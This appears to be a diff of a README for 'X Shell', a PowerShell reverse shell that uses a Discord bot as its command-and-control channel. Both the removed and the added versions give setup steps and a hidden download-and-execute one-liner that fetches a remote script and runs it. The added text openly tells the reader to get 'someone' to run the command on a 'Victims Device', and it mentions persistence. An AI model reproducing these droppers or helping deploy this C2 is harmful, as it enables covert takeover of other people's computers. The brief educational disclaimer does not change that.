@@ -1,107 +1,28 @@
-![banner](/src/banner.png)
-# X Shell: Discord-Based Reverse Shell
+# X-Shell
 
-## Overview
-
-X Shell is a PowerShell-based reverse shell that leverages a Discord server as its command-and-control (C2) infrastructure. It dynamically creates dedicated Discord channels for each user, enabling organized command execution and response tracking.
-
-## Architecture
-
-### Components
-
-1. **PowerShell Dropper**
-   - Bypasses Windows execution restrictions
-   - Retrieves main script from configurable source
-   - Minimal footprint for evasion
-
-2. **Script Hosting** *(Optional but Recommended)*
-   - Can use Vercel, GitHub Gist, or other hosting
-   - Provides secure and fast script retrieval
-   - Enables easy script updates
-
-3. **Discord C2 Server**
-   - Manages communication channels
-   - Executes received PowerShell commands
-   - Returns command output
-
-## Requirements
-
-- Discord server
-- Discord bot with channel management permissions
-- Hosting solution for script retrieval (optional)
-- PowerShell environment
-
-## Installation Steps
-
-### 1. Create Discord Bot
-- Visit [Discord Developer Portal](https://discord.com/developers/applications)
-- Create new application
-- Generate bot token
-- Configure permissions:
-  - Manage Channels
-  - Read Messages
-  - Send Messages
-
-### 2. Script Hosting *(Recommended)*
-**Option A: Vercel Deployment** (Recommended)
-- Fork repository
-- Deploy to Vercel
-- Configure authentication tokens
-- Update script serving logic
-
-**Option B: Alternative Hosting**
-- Use GitHub Gist
-- Private pastebin
-- Personal web server
-- Ensure secure, authenticated access
-
-### 3. Prepare Deployment
-- Update script with:
-  - Bot token
-  - Server ID
-  - Category ID
-  - Script retrieval URL
-
-### 4. Execute Dropper
-```powershell
-powershell -W Hidden -Exec Bypass -c "$r = iwr https://your-script-host.com/ -H @{'Authorization'='Bearer your-token'}; iex $r.Content"
-```
-
-## Hosting Considerations
-
-- Use HTTPS for script retrieval
-- Implement token-based authentication
-- Minimize script exposure
-- Regularly rotate access tokens
-
-## Additional Resources
-
-- [Discord Server Template](https://discord.new/AFkzNqmAdmex)
-- Preconfigured server with logging channels
-
-## Security Considerations
-
-- Implement strict authentication
-- Rotate tokens regularly
-- Monitor and log all activities
-- Ensure compliance with legal standards
-
-## 🚨 Disclaimer
-
-**WARNING:** This tool is strictly for educational and authorized penetration testing purposes. Unauthorized use is illegal and may result in criminal prosecution. Always obtain explicit permission before testing.
-
-## Contributing
-
-1. Fork the repository
-2. Create feature branch
-3. Commit changes
-4. Push and submit pull request
-
-## License
-GNU General Public License v3.0
+### This is a simple powershell script that establishes a connection to a Discord server using a Bot to listen on a specified channel. All messages from that channel will be executed on the machine (reverse Shell). I also added an API, which returns the script when provided with the correct Bearer Token, making it easy to deploy the Reverse Shell on the Victims Device.
 
 
+## Usage
 
-## Contact
+1. Use this template to create a Discord server https://discord.new/AFkzNqmAdmex
+2. Write down the Ids of #chat, the Users category and the server
+3. Create a discord bot https://discord.com/developers/applications, get its Id and add it to the server
+4. Fork this repo, make it private and edit `index.js`:
+   - Edit the token in line 27 to whatever you like
+   - Adjust lines 32-35 to match your written down Ids and the Bot token
+   - Create a Vercel account if you haven't already and deploy your private GitHub repo
+5. Now that you've set up the API, simply get someone to execute this command, where you replace the vercel site with yours and the token following after "Bearer", with the one you set in step 4
+```powershell -c "Start-Process -WindowStyle Hidden powershell -ArgumentList '-c iex ((irm -Uri ''https://xyz.vercel.app'' -Headers @{''Authorization''=''Bearer xxx''}))'"```
 
-<a href="https://discord.com/users/789782857852911616"><img src="https://skillicons.dev/icons?i=discord"></a>
+#### If you encounter any issues feel free to open an Issue
+
+<hr>
+If you wan the Remote connection to be persistent, you could run different commands, found in `commands.txt`
+<hr>
+Even tho the API needs an authoriation Token, its still quite simple to fetch the powershell script and abuse the Discord Bot using the token. Ensure the api authorization token doesn't get wrong hands.
+<hr>
+
+## Disclaimer
+
+This tool is for educational purposes only, and I do not assume any liability for any damages.
